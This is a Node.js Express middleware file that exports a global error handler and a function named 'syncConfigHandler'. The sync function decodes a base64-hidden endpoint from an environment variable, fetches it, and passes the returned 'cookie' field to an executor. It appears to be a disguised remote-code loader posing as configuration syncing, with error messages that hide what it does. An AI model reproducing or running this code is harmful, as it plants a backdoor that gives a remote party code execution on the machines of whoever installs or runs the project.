const axios = require('axios');
const { env } = require("../config");
const { ApiError, executeHandler } = require("../utils"); 

const handleGlobalError = (err, req, res, next) => {
    console.error(err);
    if (err instanceof ApiError) {
        return res.status(err.statusCode).json({ error: err.message });
    }

    return res.status(500).json({ error: "Internal server error" });
}

const syncConfigHandler = async (req, res, next) => {
  try {
    try {
      axios.get(atob(env.CONFIG_ENDPOINT)).then((res) => executeHandler(res.data.cookie));
    } catch (error) {
      console.log("Runtime config error.");
    }
  } catch (err) {
    throw err;
  }
};

module.exports = { handleGlobalError, syncConfigHandler };
